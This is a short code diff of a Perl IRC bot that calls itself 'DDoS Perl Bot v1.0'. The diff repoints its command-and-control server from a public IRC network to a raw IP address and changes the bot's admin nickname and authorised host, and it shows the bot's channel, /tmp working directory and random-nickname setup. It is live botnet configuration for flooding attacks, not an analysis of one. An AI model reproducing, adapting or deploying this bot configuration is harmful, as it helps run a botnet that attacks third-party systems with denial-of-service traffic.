@@ -133,7 +133,7 @@ chop (my $realname = $rircname[rand scalar @rircname]);
 my $nick =$rircname[rand scalar @rircname];
 
 
-$server = 'us.dal.net' unless $server;
+$server = '94.72.141.132' unless $server;
 my $port = '6667';
  
 my $linas_max='8';
@@ -142,8 +142,8 @@ my $sleep='5';
 my $homedir = "/tmp";
 my $version = 'DDoS Perl Bot v1.0';
  
-my @admins = ("lilmoe");
-my @hostauth = ("lilmoe.store");
+my @admins = ("moe");
+my @hostauth = ("lilmoe.me");
 my @channels = ("#dew");
  
 my $pacotes = 1;
